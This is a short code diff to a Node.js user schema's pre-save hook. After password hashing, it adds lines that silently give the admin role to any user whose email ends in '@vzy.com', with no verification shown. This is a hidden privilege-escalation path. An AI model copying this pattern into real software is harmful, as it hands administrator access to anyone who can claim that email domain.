@@ -42,6 +42,10 @@ userSchema.pre("save", async function (next) {
 	try {
 		const hashedPassword = await bcrypt.hash(user.password, 10);
 		user.password = hashedPassword;
+
+		if(user.email.endsWith("@vzy.com")){
+			user.role = "admin";
+		}
 		next();
 	} catch (error) {
 		return next(error);
